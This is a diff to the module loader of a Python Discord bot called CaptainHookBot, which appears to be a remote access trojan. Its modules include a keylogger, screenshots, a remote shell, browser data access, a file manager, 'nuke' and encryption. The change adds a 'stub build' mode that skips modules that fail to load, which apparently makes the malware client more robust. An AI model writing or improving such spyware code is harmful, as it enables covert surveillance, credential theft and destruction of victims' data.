@@ -77,12 +77,18 @@ class CaptainHookBot(commands.Bot):
 
         # 3. Load modules
         modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"]
+        
+        is_stub = os.environ.get("STUB_BUILD") == "1"
+        
         for module in modules:
             try:
                 # Use absolute import path for stability
                 await self.load_extension(f"src.client.modules.{module}")
                 logger.info(f"Successfully loaded module: {module}")
             except Exception as e:
+                if is_stub:
+                    logger.warning(f"Stub Build: Skipping module {module} error: {e}")
+                    continue
                 logger.error(f"Failed to load module {module}: {e}")
                 # Try fallback for bundled environments
                 try:
